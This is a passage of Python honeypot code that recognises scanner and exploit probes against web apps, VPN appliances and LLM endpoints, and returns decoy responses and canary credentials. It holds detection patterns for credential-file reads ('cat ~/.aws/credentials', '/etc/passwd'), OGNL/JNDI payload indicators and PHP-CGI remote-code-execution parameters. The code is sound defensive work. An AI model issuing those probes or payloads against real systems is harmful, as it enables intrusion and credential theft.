_OPENAPI_SWAGGER_JSON_PATHS = frozenset({
    "/swagger.json",
    "/swagger/swagger.json",
    "/swagger/v1/swagger.json",
    "/swagger/v2/swagger.json",
    "/swagger/v3/swagger.json",
    "/api/swagger.json",
    "/api/swagger",
    "/api-docs",
    "/api-docs/",
    "/api-docs.json",
    "/api-docs/swagger.json",
    "/api/api-docs",
    "/v2/api-docs",
    "/v3/api-docs",
    "/openapi.json",
    "/openapi",
    "/api/openapi.json",
    "/api/v1/openapi.json",
    "/docs/openapi.json",
})
_OPENAPI_SWAGGER_YAML_PATHS = frozenset({
    "/openapi.yaml",
    "/openapi.yml",
    "/swagger.yaml",
    "/swagger.yml",
})
_OPENAPI_SWAGGER_UI_PATHS = frozenset({
    "/swagger-ui.html",
    "/swagger-ui/",
    "/swagger-ui/index.html",
    "/swagger/index.html",
    "/swagger/swagger-ui.html",
    "/swagger/ui/index.html",
    "/swagger/ui",
    "/webjars/swagger-ui/index.html",
    "/webjars/swagger-ui/swagger-ui.html",
    "/api/swagger-ui",
    "/api/swagger-ui/",
    "/api/swagger-ui/index.html",
    "/api/docs",
    "/api/docs/",
    "/docs",
    "/docs/",
    "/redoc",
    "/redoc/",
    "/redoc.html",
})


# --- Backup-archive canary trap ----------------------------------------
# Scanner dictionaries enumerate the cross product `<base>.<ext>` of a
# 60+-name base list and ~15 compressed-archive extensions hunting for
# misplaced backups in the webroot. Newer scanners also synthesise
# filenames from the target's resolved IP (`/65.20.84.180.tar.gz`,
# `/84.180.tar.gz`, `/84.tar.gz`) and from current/recent year + month
# (`/2026.tar.gz`, `/202603.zip`). Every hit currently 404s — this
# trap matches the pattern and serves a real gzip/zip/tar containing
# a fake `.env` + SQL dump with embedded Tracebit AWS canary creds,
# so any harvester that grep-fetches the body walks away with a
# replay-fireable canary.
BACKUP_ARCHIVE_ENABLED = _env_bool("HONEYPOT_BACKUP_ARCHIVE_ENABLED")

_BACKUP_ARCHIVE_BASES = frozenset({
    "admin", "api", "app", "application", "archive", "archives", "back",
    "backend", "backup", "backup1", "backup2", "backup_db", "backup_full",
    "backups", "bak", "bd", "build", "client", "code", "config", "configs",
    "content", "current", "data", "database", "databases", "db", "db1",
    "db2", "db_backup", "db_dump", "dev", "dist", "django", "drupal",
    "dump", "dumps", "env", ".env", "export", "exports", "files", "flask",
    "frontend", "full", "full_backup", "home", "htdocs", "joomla",
    "laravel", "magento", "media", "mysqldump", "new", "node_modules",
    "old", "opt", "pg_dump", "pre-prod", "preprod", "private", "prod",
    "production", "public", "public_html", "rails", "release", "releases",
    "root", "secrets", "server", "site", "site_backup", "sites", "source",
    "src", "stage", "staging", "storage", "symfony", "temp", "test",
    "tmp", "uploads", "user", "users", "var", "web", "website",
    "website-backup", "website_backup", "wordpress", "wp", "wp-admin",
    "wp-backup", "wp-content", "wp-includes", "www", "www-backup",
})

# Longest-first so we strip `.tar.gz` before `.gz` when peeling the
# extension off a path like `/backup.tar.gz`.
_BACKUP_ARCHIVE_EXTS = (
    "tar.gz", "tar.bz2", "tar.xz", "sql.gz", "sql.bz2",
    "tgz", "tbz2", "txz",
    "tar", "sql",
    "gz", "bz2", "xz",
    "zip", "7z", "rar", "zst",
)
_BACKUP_ARCHIVE_STEM_RE = re.compile(r"^[A-Za-z0-9._\-]{1,80}$")
_BACKUP_ARCHIVE_IP_STEM_RE = re.compile(r"^(?:\d{1,3}\.){0,3}\d{1,3}$")
_BACKUP_ARCHIVE_DATE_STEM_RE = re.compile(r"^(?:19|20)\d{2}(?:\d{2}){0,2}$")


def _backup_archive_match(path: str) -> str:
    """Return the lowercase extension family (e.g. 'tar.gz', 'zip') if
    `path` matches a backup-archive shape, else ''. The matcher accepts
    three stem shapes: a known dictionary base name, an IP-octet chain
    (`84`, `84.180`, `65.20.84.180`), or a year / yearmonth / yearmonthday."""
    if not BACKUP_ARCHIVE_ENABLED:
        return ""
    if not path.startswith("/") or path.count("/") != 1:
        return ""
    lowered = path[1:].lower()
    if not lowered:
        return ""
    for ext in _BACKUP_ARCHIVE_EXTS:
        if lowered.endswith("." + ext):
            stem = lowered[: -(len(ext) + 1)]
            if not stem or not _BACKUP_ARCHIVE_STEM_RE.match(stem):
                continue
            if stem in _BACKUP_ARCHIVE_BASES:
                return ext
            if _BACKUP_ARCHIVE_IP_STEM_RE.match(stem):
                return ext
            if _BACKUP_ARCHIVE_DATE_STEM_RE.match(stem):
                return ext
            return ""
    return ""


def is_backup_archive_path(path: str) -> bool:
    return bool(_backup_archive_match(path))


def utc_now() -> str:
    return datetime.now(UTC).isoformat().replace("+00:00", "Z")


def append_log(payload: dict[str, object]) -> None:
    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    with LOG_PATH.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(payload, sort_keys=True) + "\n")


def first_forwarded_ip(header_value: str) -> str:
    if not header_value:
        return ""
    return header_value.split(",", 1)[0].strip()


def clean_host(header_value: str) -> str:
    if not header_value:
        return ""
    value = header_value.strip().lower()
    if not value:
        return ""
    if value.startswith("["):
        bracket_end = value.find("]")
        if bracket_end != -1:
            return value[1:bracket_end]
    if value.count(":") == 1:
        host_value, port_value = value.rsplit(":", 1)
        if port_value.isdigit():
            return host_value
    return value


def header_subset(headers: object) -> dict[str, str]:
    values: dict[str, str] = {}
    for name in LOG_HEADER_NAMES:
        value = headers.get(name)
        if value:
            values[name] = value[:HEADER_VALUE_LOG_LIMIT]
    return values


def normalize_path(raw_path: str) -> str:
    if not raw_path:
        return "/"
    decoded = unquote(raw_path)
    collapsed = re.sub(r"/+", "/", decoded)
    return collapsed if collapsed.startswith("/") else f"/{collapsed}"


def extract_git_path(path: str) -> str | None:
    """Return the canonical `/.git/...` lookup key, or None if `path` isn't
    a request for a /.git tree file.

    Accepts:
      - exact `/.git` (root) and `/.git/` (directory-ish)
      - `/.git/<anything>`
      - `/<any prefix>/.git/<anything>` — scanners enumerate apps deployed
        at subpaths, e.g. `/login/.git/config`, `/project/.git/HEAD`,
        `/api/.git/index`
      - case-insensitive (`/.GiT/CoNfIg` → `/.git/config`)

    Lowercases the result for case-insensitive lookup against the
    canonical `files` map keys (which are all lowercase).
    """
    if not path:
        return None
    lower = path.lower()
    if lower == "/.git" or lower == "/.git/":
        return "/.git/"
    if lower.startswith("/.git/"):
        return lower
    idx = lower.find("/.git/")
    if idx > 0:
        return lower[idx:]
    return None


def is_tarpit_path(path: str) -> bool:
    stripped = path.rstrip("/") or "/"
    if stripped == "/.env":
        return False
    # Paths with a dedicated CanaryTrap entry (e.g. `/.env.production`,
    # `/.env.vault`, `/mailer/.env`) take the canary response, not the
    # generic tarpit. Without this exemption the dispatch order in
    # `handle()` — tarpit first, canary trap second — silently shadows
    # those entries and turns them into dead code.
    if stripped.lower() in _TRAP_BY_PATH:
        return False
    if stripped.endswith("/.env"):
        return True
    leaf = stripped.rsplit("/", 1)[-1]
    return leaf.startswith(".env") and leaf != ".env"


def is_fingerprint_path(path: str) -> bool:
    """Generic paths that route into the tarpit + module chain for
    fingerprinting. Separate from `.env` variants so they can be disabled
    independently (they're much louder — they hit every first-contact scanner)."""
    if not FINGERPRINT_PATHS_ENABLED:
        return False
    normalized = path.lower() or "/"
    if normalized in FINGERPRINT_PATHS:
        return True
    # Allow "/" to match whether the caller passed "/" or "".
    if normalized == "" and "/" in FINGERPRINT_PATHS:
        return True
    return False


def is_webshell_path(path: str) -> bool:
    if not WEBSHELL_ENABLED:
        return False
    lowered = path.lower()
    if lowered in WEBSHELL_PATHS:
        return True
    for pattern in _WEBSHELL_PATH_REGEXES:
        if pattern.match(lowered):
            return True
    return False


def is_llm_endpoint_path(path: str) -> bool:
    if not LLM_ENDPOINT_ENABLED:
        return False
    return path.lower() in LLM_ENDPOINT_PATHS


def _file_upload_family(path: str) -> str:
    """Return the file-upload family for `path`, or '' if no match.

    Families: 'kcfinder', 'jquery-filer', 'blueimp-jquery-file-upload'.
    Match is case-insensitive on the lowercased path. The matchers tolerate
    arbitrary leading directory prefixes so a single trap covers every
    observed webroot-prefix variant without an enumeration list.
    """
    p = path.lower()
    if _FILE_UPLOAD_KCFINDER_RE.match(p):
        return "kcfinder"
    if _FILE_UPLOAD_JQFILER_RE.match(p):
        return "jquery-filer"
    if _FILE_UPLOAD_BLUEIMP_RE.match(p):
        return "blueimp-jquery-file-upload"
    return ""


def is_file_upload_path(path: str) -> bool:
    if not FILE_UPLOAD_ENABLED:
        return False
    return bool(_file_upload_family(path))


def is_webapp_form_path(path: str) -> bool:
    if not WEBAPP_FORM_ENABLED:
        return False
    return _webapp_form_match(path) is not None


def _webapp_form_match(path: str) -> str | None:
    """Return the result-tag suffix for `path`, or None. Tolerates a
    trailing slash so `/login` and `/login/` both match the same group."""
    p = path.lower()
    if p in WEBAPP_FORM_PATH_SUFFIX:
        return WEBAPP_FORM_PATH_SUFFIX[p]
    stripped = p.rstrip("/") or "/"
    return WEBAPP_FORM_PATH_SUFFIX.get(stripped)


def is_wp_login_path(path: str) -> bool:
    if not WP_LOGIN_ENABLED:
        return False
    return path.lower() in WP_LOGIN_PATHS


def is_wp_admin_path(path: str) -> bool:
    if not WP_LOGIN_ENABLED:
        return False
    return path.lower() in WP_LOGIN_ADMIN_PATHS


def is_sonicwall_path(path: str) -> bool:
    if not SONICWALL_ENABLED:
        return False
    return path.lower() in SONICWALL_PATHS


def is_cisco_webvpn_path(path: str) -> bool:
    if not CISCO_WEBVPN_ENABLED:
        return False
    return path.lower() in CISCO_WEBVPN_PATHS


def is_ivanti_vpn_path(path: str) -> bool:
    if not IVANTI_VPN_ENABLED:
        return False
    return path.lower() in IVANTI_VPN_PATHS


def is_aspera_faspex_path(path: str) -> bool:
    if not ASPERA_FASPEX_ENABLED:
        return False
    return path.lower() in ASPERA_FASPEX_PATHS


def is_fortigate_vpn_path(path: str) -> bool:
    if not FORTIGATE_VPN_ENABLED:
        return False
    return path.lower() in FORTIGATE_VPN_PATHS


def is_citrix_gateway_path(path: str) -> bool:
    if not CITRIX_GATEWAY_ENABLED:
        return False
    return path.lower() in CITRIX_GATEWAY_PATHS


def is_rdweb_path(path: str) -> bool:
    if not RDWEB_ENABLED:
        return False
    return path.lower() in RDWEB_PATHS


def is_globalprotect_path(path: str) -> bool:
    if not GLOBALPROTECT_ENABLED:
        return False
    return path.lower().split("?")[0] in GLOBALPROTECT_PATHS


def is_sophos_vpn_path(path: str) -> bool:
    if not SOPHOS_VPN_ENABLED:
        return False
    return path.lower() in SOPHOS_VPN_PATHS


def is_barracuda_vpn_path(path: str) -> bool:
    if not BARRACUDA_VPN_ENABLED:
        return False
    return path.lower().split("?")[0] in BARRACUDA_VPN_PATHS


def is_f5_bigip_path(path: str) -> bool:
    if not F5_BIGIP_ENABLED:
        return False
    lp = path.lower().split("?")[0]
    if lp in F5_BIGIP_PATHS:
        return True
    if lp.startswith("/tmui/"):
        return True
    return False


_DOCKER_REGISTRY_V2_RE = re.compile(
    r"^/v2/(?:"
    r"_catalog"
    r"|([a-z0-9_./-]+)/(?:tags/list|manifests/[a-zA-Z0-9._:+-]+|blobs/sha256:[0-9a-f]{64})"
    r")$"
)


def is_docker_registry_path(path: str) -> bool:
    if not DOCKER_REGISTRY_ENABLED:
        return False
    lp = path.lower().split("?")[0]
    if lp in ("/v2/", "/v2"):
        return True
    return _DOCKER_REGISTRY_V2_RE.match(lp) is not None


def is_hikvision_path(path: str) -> bool:
    if not HIKVISION_ENABLED:
        return False
    return path.lower() in HIKVISION_PATHS


def is_hnap1_path(path: str) -> bool:
    if not HNAP1_ENABLED:
        return False
    return path.lower() in HNAP1_PATHS


# OGNL / Java-runtime indicators surfaced when CVE-2024-36401 (or related
# expression-language exploits) ships its payload in an OGC Filter or wicket
# parameter. Match is case-insensitive against the raw query string + body
# preview; presence flips the geoserverHasOgnl log field for fast triage.
_GEOSERVER_OGNL_INDICATORS = (
    "runtime.getruntime",
    "java.lang.runtime",
    "processbuilder",
    "exec(",
    "system-properties",
    "javax.naming",
    "valuereference",
    "evaluateproperty",
)


def _geoserver_has_ognl(query: str, body_preview: str) -> bool:
    haystack = f"{query} {body_preview}".lower()
    return any(needle in haystack for needle in _GEOSERVER_OGNL_INDICATORS)


def is_geoserver_path(path: str) -> bool:
    if not GEOSERVER_ENABLED:
        return False
    p = path.lower()
    if p == "/geoserver":
        return True
    return p.startswith("/geoserver/")


def is_cmd_injection_path(path: str) -> bool:
    if not CMD_INJECTION_ENABLED:
        return False
    return path.lower() in CMD_INJECTION_PATHS


def is_phpunit_eval_path(path: str) -> bool:
    if not PHPUNIT_EVAL_ENABLED:
        return False
    p = path.lower()
    return p.endswith("/eval-stdin.php") and "phpunit" in p


def openapi_swagger_kind(path: str) -> str:
    """Return 'spec-json' / 'spec-yaml' / 'ui-html' / '' for `path`.

    Empty string means the path doesn't match. Lowercased for
    case-insensitive matching against the constant sets above.
    """
    p = path.lower()
    if p in _OPENAPI_SWAGGER_JSON_PATHS:
        return "spec-json"
    if p in _OPENAPI_SWAGGER_YAML_PATHS:
        return "spec-yaml"
    if p in _OPENAPI_SWAGGER_UI_PATHS:
        return "ui-html"
    return ""


def is_openapi_swagger_path(path: str) -> bool:
    if not OPENAPI_SWAGGER_ENABLED:
        return False
    return bool(openapi_swagger_kind(path))


def is_apache_cgi_shell_path(path: str, body: bytes = b"") -> bool:
    if not BODY_RCE_ENABLED or not body:
        return False
    p = path.lower()
    if p == "/bin/sh":
        return True
    return p.startswith("/cgi-bin/") and p.endswith("/bin/sh") and "../" in p


def is_php_cgi_rce_request(path: str, query: str) -> bool:
    if not BODY_RCE_ENABLED:
        return False
    decoded = unquote(query or "").lower()
    return (
        "allow_url_include" in decoded
        and "auto_prepend_file" in decoded
        and "php://input" in decoded
    )


def is_body_rce_request(path: str, query: str, body: bytes = b"") -> bool:
    return is_apache_cgi_shell_path(path, body) or is_php_cgi_rce_request(path, query)


# Regex that matches a `cat`-of-a-credential-file probe. Supports URL-decoded
# `cat /root/.aws/credentials`, tilde-home `cat ~/.aws/credentials`, and
# `aws/config` as the second-most-common variant. Whitespace is normalised
# before matching so single/multi/tab separators all work.
_CRED_FILE_AWS_CREDS_RE = re.compile(
    r"\bcat\s+(/root/|~/|/home/[^/]+/)?\.aws/credentials\b",
)
_CRED_FILE_AWS_CONFIG_RE = re.compile(
    r"\bcat\s+(/root/|~/|/home/[^/]+/)?\.aws/config\b",
)
_PASSWD_RE = re.compile(r"\bcat\s+/etc/(passwd|shadow)\b")
_PRINTENV_RE = re.compile(r"\b(printenv|env)\b\s*$")
_HOSTNAME_RE = re.compile(r"^\s*hostname\s*$")
_ID_RE = re.compile(r"^\s*id\s*$")
_WHOAMI_RE = re.compile(r"^\s*whoami\s*$")
_UNAME_RE = re.compile(r"^\s*uname(\s+-[arms]+)?\s*$")
_PWD_RE = re.compile(r"^\s*pwd\s*$")
_LS_RE = re.compile(r"^\s*ls(\s+-[la]+)?\s*$")
_PHP_MD5_ECHO_RE = re.compile(r"md5\s*\(\s*['\"]([^'\"]{1,160})['\"]\s*\)", re.IGNORECASE)
_PHP_ECHO_STRING_RE = re.compile(r"\becho\s+['\"]([^'\"]{1,240})['\"]", re.IGNORECASE)
_PHP_BASE64_DECODE_RE = re.compile(r"base64_decode\s*\(\s*['\"]([A-Za-z0-9+/=]{8,4096})['\"]\s*\)", re.IGNORECASE)


def decode_body_preview(body: bytes, limit: int = BODY_RCE_PREVIEW_LIMIT) -> str:
    if not body:
        return ""
    return body[:limit].decode("utf-8", errors="replace")


def php_probe_output(body_preview: str) -> bytes:
    """Return the simple echo/md5 output common PHP exploit probes expect."""
    md5_match = _PHP_MD5_ECHO_RE.search(body_preview)
    if md5_match:
        return (hashlib.md5(md5_match.group(1).encode("utf-8")).hexdigest() + "\n").encode("utf-8")
    echo_match = _PHP_ECHO_STRING_RE.search(body_preview)
    if echo_match:
        return (echo_match.group(1) + "\n").encode("utf-8")
    return b""


def extract_php_base64_command(body_preview: str) -> str:
    match = _PHP_BASE64_DECODE_RE.search(body_preview)
    if not match:
        return ""
    encoded = match.group(1)
    try:
        return base64.b64decode(encoded + "=" * (-len(encoded) % 4), validate=False).decode(
            "utf-8", errors="replace",
        )
    except Exception:
        return ""


def extract_cisco_webvpn_form(body: bytes, content_type: str) -> tuple[str, bool]:
    form = parse_form_body(body, content_type)
    username = ""
    for key in ("username", "user", "login"):
        values = form.get(key) or form.get(key.upper())
        if values and values[0]:
            username = values[0][:120]
            break
    has_password = any(bool((form.get(key) or form.get(key.upper()) or [""])[0]) for key in ("password", "pass"))
    return username, has_password


def is_cisco_anyconnect_config_auth(path: str, body: bytes) -> bool:
    if not CISCO_WEBVPN_ENABLED or path != "/" or not body:
        return False
    preview = decode_body_preview(body, 256).lower()
    return "<config-auth" in preview and 'client="vpn"' in preview


def extract_anyconnect_version(body: bytes) -> str:
    preview = decode_body_preview(body, 512)
    match = re.search(r"<version\s+who=['\"]vpn['\"]>([^<]{1,80})</version>", preview, re.IGNORECASE)
    return match.group(1) if match else ""


def classify_cmd_injection_command(command: str) -> str:
    """Return the family tag for the command. Used to route to a renderer
    and to label the log row for triage. 'unknown' for anything we don't
    recognise — those get an empty body, matching shell behaviour for
    assignments / builtins like `cd`."""
    if not command:
        return ""
    norm = " ".join(command.split())  # collapse whitespace
    norm_lower = norm.lower()
    if _CRED_FILE_AWS_CREDS_RE.search(norm_lower):
        return "creds-aws"
    if _CRED_FILE_AWS_CONFIG_RE.search(norm_lower):
        return "creds-aws-config"
    if _PASSWD_RE.search(norm_lower):
        return "passwd"
    if _PRINTENV_RE.search(norm_lower):
        return "env"
    if _ID_RE.match(norm_lower):
        return "id"
    if _WHOAMI_RE.match(norm_lower):
        return "whoami"
    if _UNAME_RE.match(norm_lower):
        return "uname"
    if _HOSTNAME_RE.match(norm_lower):
        return "hostname"
    if _PWD_RE.match(norm_lower):
        return "pwd"
    if _LS_RE.match(norm_lower):
        return "ls"
    return "unknown"


def extract_cmd_injection_command(
    query_params: dict[str, list[str]],
    form_params: dict[str, list[str]],
) -> tuple[str, str, str]:
    """Return (source, key, command). source='' means no cmd= present."""
    for source, collection in (("query", query_params), ("form", form_params)):
        for key in CMD_INJECTION_COMMAND_KEYS:
            for candidate in (key, key.upper()):
                values = collection.get(candidate)
                if values and values[0]:
                    return source, candidate, values[0]
    return "", "", ""


_COLDFUSION_EXPLOIT_INDICATORS = (
    "../",
    "..\\",
    "adminpassword",
    "cfadminpassword",
    "administrator.cfc",
    "accessmanager.cfc",
    "runtime.getruntime",
    "java.lang.runtime",
    "processbuilder",
    "javax.naming",
    "jndi:",
    "wddxpacket",
    "deserialize",
    "objectinputstream",
    "cfclient",
    "method=login",
)


def _coldfusion_has_exploit(path: str, query: str, body_preview: str) -> bool:
    haystack = f"{path} {query} {body_preview}".lower()
    return any(needle in haystack for needle in _COLDFUSION_EXPLOIT_INDICATORS)


def is_coldfusion_path(path: str) -> bool:
    if not COLDFUSION_ENABLED:
        return False
    p = path.lower()
    if p in COLDFUSION_PATHS:
        return True
    return (
        p.startswith("/cfide/componentutils/")
        or p.startswith("/cfide/administrator/")
        or p.startswith("/cfide/adminapi/")
    )


def is_nextjs_path(path: str) -> bool:
    if not NEXTJS_ENABLED:
        return False
    p = path.lower()
    if p in NEXTJS_PATHS:
        return True
    return p.startswith(_NEXTJS_PATH_PREFIXES)


def is_confluence_path(path: str) -> bool:
    if not CONFLUENCE_ENABLED:
        return False
    p = path.lower()
    if p in CONFLUENCE_PATHS:
        return True
    # CVE-2022-26134 ships the OGNL Runtime.exec() expression inside the
    # request path (URL-encoded). Real Confluence never sees these; routing
    # them to the Confluence handler captures the OAST callback domain.
    if "%24%7b%40" in p or "${@" in p:
        return True
    # Common deeper Confluence sub-paths used as fingerprint pivots.
    if (
        p.startswith("/pages/")
        or p.startswith("/confluence/pages/")
        or p.startswith("/wiki/pages/")
    ):
        # Only match the action variants — bare /pages/ on its own is too
        # generic and would steal traffic from other web apps.
        return p.endswith(".action") or "createpage-entervariables" in p or "doenterpagevariables" in p
    return False


def is_sap_metadatauploader_path(path: str) -> bool:
    """Match the SAP NetWeaver Visual Composer MetadataUploader servlet.

    Real deployments expose it at `/developmentserver/metadatauploader`.
    Some reverse-proxy layouts deploy NetWeaver under a webroot prefix —
    cover the bare path plus the `/irj/` (Enterprise Portal) and `/nwa/`
    (NetWeaver Administrator) prefixes scanner dictionaries enumerate.
    Case-insensitive; trailing slash variants both match.
    """
    if not SAP_METADATAUPLOADER_ENABLED:
        return False
    p = path.lower().rstrip("/")
    return p in {
        "/developmentserver/metadatauploader",
        "/irj/developmentserver/metadatauploader",
        "/nwa/developmentserver/metadatauploader",
        "/sap/developmentserver/metadatauploader",
    }


def is_drupal_path(path: str) -> bool:
    """Match `/user/register` — the CVE-2018-7600 ("Drupalgeddon2")
    trigger path.

    The full exploit URL is `/user/register?element_parents=account/mail
    /%23value&ajax_form=1&_wrapper_format=drupal_ajax` — the routing
    decision lives in the query string, not the path, so we match on
    the bare path and let the handler parse the query/body for the
    Drupalgeddon2 indicator set.

    We deliberately do NOT match `/user/login` or `/user/password`
    even though Drupal exposes them. Those paths already route to
    the generic web-app form responder (`/user/login` is in
    `_WEBAPP_FORM_LOGIN_PATHS`), which has tested credential capture.
    Stealing them here would replace good behaviour with thinner
    behaviour and break the existing webapp-form-login result tag.

    Settings.php and friends are served as CanaryTrap entries (exact
    path lookup, not handler dispatch), so they're not in this set.
    """
    if not DRUPAL_ENABLED:
        return False
    p = path.lower().rstrip("/")
    return p in {
        "/user/register",
        # Sub-path registration used in some Drupal 8/9 deployments
        # that route through the legacy `?q=` query parameter.
        "/?q=user/register",
        # Webroot-prefix variants — Drupal-under-subpath deployments.
        "/drupal/user/register",
        "/cms/user/register",
    }


def is_spring_gateway_path(path: str) -> bool:
    """Match the Spring Cloud Gateway Actuator surface targeted by
    CVE-2022-22947 (SpEL-injection RCE through route filter args).

    The vulnerable endpoints are `/actuator/gateway/routes`,
    `/actuator/gateway/routes/{id}` (route registration / read /
    delete), `/actuator/gateway/refresh` (force route-table reload),
    and the supporting read-only `/globalfilters` / `/routefilters` /
    `/routepredicates` endpoints. Real deployments also expose these
    under the `/manage`, `/management`, and `/api/actuator`
    reverse-proxy aliases that the existing `actuator-env` trap covers,
    so we mirror that prefix set.

    Routing by prefix because `/routes/{id}` is a per-request id.
    """
    if not SPRING_GATEWAY_ENABLED:
        return False
    p = path.lower().rstrip("/")
    prefixes = (
        "/actuator/gateway",
        "/manage/gateway",
        "/management/gateway",
        "/api/actuator/gateway",
    )
    for prefix in prefixes:
        if p == prefix or p.startswith(prefix + "/"):
            return True
    return False


def extract_sonicwall_username(body: bytes, content_type: str) -> str:
    """Pull `user`/`username` out of a SonicOS auth body. SonicOS accepts
    both JSON and form-encoded auth POSTs in the wild; try both. Returns
    "" if neither shape matches or the field is absent.
    """
    if not body:
        return ""
    ct = (content_type or "").split(";", 1)[0].strip().lower()
    if ct in {"application/json", ""}:
        try:
            payload = json.loads(body.decode("utf-8", errors="replace"))
        except (ValueError, UnicodeDecodeError):
            payload = None
        if isinstance(payload, dict):
            for key in ("user", "username", "login"):
                value = payload.get(key)
                if isinstance(value, str) and value:
                    return value[:120]
    if ct in {"application/x-www-form-urlencoded", ""}:
        try:
            form = parse_qs(body.decode("utf-8", errors="replace"), keep_blank_values=True)
        except (UnicodeDecodeError, ValueError):
            form = {}
        for key in ("user", "username", "login"):
            values = form.get(key) or form.get(key.upper())
            if values and values[0]:
                return values[0][:120]
    return ""


# Models advertised by the listings. Chosen to mix Ollama-native names
# (`llama3.2:latest`) with OpenAI- and Anthropic-branded ids so every scanner
# that filters by model name sees at least one plausible match.
_LLM_MODEL_NAMES: tuple[str, ...] = (
    "llama3.2:latest",
    "llama3.1:8b",
    "qwen2.5-coder:7b",
    "mistral:7b",
    "deepseek-r1:7b",
    "gemma2:9b",
    "gpt-4o",
    "gpt-4o-mini",
    "claude-3-5-sonnet-20241022",
    "claude-3-5-haiku-20241022",
)


def extract_llm_prompt(body: bytes, content_type: str) -> tuple[str, str, str, bool]:
    """Best-effort pull of (model, prompt, action, has_auth_hint) from a JSON body.

    Handles the three wire formats we see probes against:
    - Ollama:         {"model": "...", "prompt": "..."}               /api/generate
                      {"model": "...", "messages": [{"role","content"}]}  /api/chat
                      {"model": "..."}                                 /api/show
    - OpenAI:         {"model": "...", "messages": [{"role","content"}]}  /v1/chat/completions
                      {"model": "...", "prompt": "..."}                /v1/completions
                      {"model": "...", "input": "..."|[..]}            /v1/embeddings
    - Anthropic:      {"model": "...", "messages": [{"role","content"}]}  /v1/messages

    Returns `(model, prompt_prefix, action, has_auth_hint)`. Unknown shape
    returns all-empty. `has_auth_hint` is always False at this layer; the
    caller fills it from the request headers. Prompt is truncated to
    LLM_BODY_DECODE_LIMIT chars.
    """
    if not body:
        return "", "", "", False
    ct = (content_type or "").split(";", 1)[0].strip().lower()
    # Ollama and OpenAI clients usually send application/json; some scanners
    # send no Content-Type at all but still use JSON, so be lenient.
    if ct not in {"application/json", ""}:
        return "", "", "", False
    try:
        payload = json.loads(body.decode("utf-8", errors="replace"))
    except (ValueError, UnicodeDecodeError):
        return "", "", "", False
    if not isinstance(payload, dict):
        return "", "", "", False

    model = ""
    raw_model = payload.get("model")
    if isinstance(raw_model, str):
        model = raw_model[:120]

    # Prefer a chat `messages` list if present, then `prompt`, then `input`.
    prompt = ""
    action = ""
    messages = payload.get("messages")
    if isinstance(messages, list) and messages:
        action = "chat"
        pieces: list[str] = []
        for msg in messages:
            if not isinstance(msg, dict):
                continue
            role = str(msg.get("role", ""))[:32]
            content = msg.get("content", "")
            if isinstance(content, list):
                # Anthropic content-block form: [{"type":"text","text":"..."}]
                text_pieces = []
                for block in content:
                    if isinstance(block, dict):
                        t = block.get("text") or block.get("content") or ""
                        if isinstance(t, str):
                            text_pieces.append(t)
                content = " ".join(text_pieces)
            if not isinstance(content, str):
                content = str(content)
            pieces.append(f"{role}: {content}" if role else content)
        prompt = "\n".join(pieces)
    elif isinstance(payload.get("prompt"), str):
        action = "completion"
        prompt = payload["prompt"]
    elif "input" in payload:
        action = "embedding"
        val = payload["input"]
        if isinstance(val, list):
            prompt = " ".join(str(x) for x in val if isinstance(x, (str, int, float)))
        else:
            prompt = str(val)

    if len(prompt) > LLM_BODY_DECODE_LIMIT:
        prompt = prompt[:LLM_BODY_DECODE_LIMIT]
    return model, prompt, action, False


# --- LLM renderers --------------------------------------------------------
# Shapes match the wire format the scanner expects well enough that it sends
# its next command. Content is deterministic — we don't need a real LLM.


def render_ollama_version() -> bytes:
    return json.dumps({"version": "0.4.7"}).encode("utf-8")


def render_ollama_tags() -> bytes:
    modified = "2026-01-15T12:00:00.000000000Z"
    payload = {
        "models": [
            {
                "name": name,
                "model": name,
                "modified_at": modified,
                "size": 4_661_211_808,
                "digest": hashlib.sha256(name.encode("utf-8")).hexdigest(),
                "details": {
                    "parent_model": "",
                    "format": "gguf",
                    "family": name.split(":", 1)[0].split("-", 1)[0],
                    "families": None,
                    "parameter_size": "7B",
                    "quantization_level": "Q4_0",
                },
            }
            for name in _LLM_MODEL_NAMES
        ]
    }
    return json.dumps(payload).encode("utf-8")


def render_ollama_ps() -> bytes:
    # "No models currently loaded" — looks like a fresh, idle server.
    return json.dumps({"models": []}).encode("utf-8")


def render_openai_models() -> bytes:
    payload = {
        "object": "list",
        "data": [
            {"id": name, "object": "model", "created": 1_735_689_600, "owned_by": "library"}
            for name in _LLM_MODEL_NAMES
        ],
    }
    return json.dumps(payload).encode("utf-8")


def render_anthropic_models() -> bytes:
    # Anthropic's /v1/models response shape: {"data":[{"type":"model","id":..}],
    # "has_more": false, "first_id": "...", "last_id": "..."}.
    anthropic_ids = [m for m in _LLM_MODEL_NAMES if m.startswith("claude-")] or [
        "claude-3-5-sonnet-20241022",
        "claude-3-5-haiku-20241022",
    ]
    data = [
        {
            "type": "model",
            "id": mid,
            "display_name": mid.replace("-", " ").title(),
            "created_at": "2024-10-22T00:00:00Z",
        }
        for mid in anthropic_ids
    ]
    payload = {
        "data": data,
        "has_more": False,
        "first_id": data[0]["id"],
        "last_id": data[-1]["id"],
    }
    return json.dumps(payload).encode("utf-8")


def render_ollama_show(model: str) -> bytes:
    model = model or "llama3.2:latest"
    payload = {
        "modelfile": f"FROM {model}\nPARAMETER temperature 0.7\n",
        "parameters": "temperature 0.7",
        "template": "{{ .Prompt }}",
        "details": {
            "parent_model": "",
            "format": "gguf",
            "family": "llama",
            "families": ["llama"],
            "parameter_size": "8B",
            "quantization_level": "Q4_0",
        },
    }
    return json.dumps(payload).encode("utf-8")


# Canned assistant reply used for any chat/completion POST. Deliberately
# bland: "plausible but boring" keeps the scanner moving to its next
# command without us having to host a real model.
_LLM_CANNED_REPLY = (
    "I can help with that. Could you share more detail about what you're "
    "trying to accomplish?"
)


def render_ollama_chat(model: str) -> bytes:
    payload = {
        "model": model or "llama3.2:latest",
        "created_at": utc_now(),
        "message": {"role": "assistant", "content": _LLM_CANNED_REPLY},
        "done": True,
        "done_reason": "stop",
        "total_duration": 1_234_567_890,
        "load_duration": 12_345_678,
        "prompt_eval_count": 24,
        "prompt_eval_duration": 123_456_789,
        "eval_count": 32,
        "eval_duration": 987_654_321,
    }
    return json.dumps(payload).encode("utf-8")


def render_ollama_generate(model: str) -> bytes:
    payload = {
        "model": model or "llama3.2:latest",
        "created_at": utc_now(),
        "response": _LLM_CANNED_REPLY,
        "done": True,
        "done_reason": "stop",
    }
    return json.dumps(payload).encode("utf-8")


def render_openai_chat(model: str) -> bytes:
    payload = {
        "id": f"chatcmpl-{uuid.uuid4().hex[:24]}",
        "object": "chat.completion",
        "created": int(time.time()),
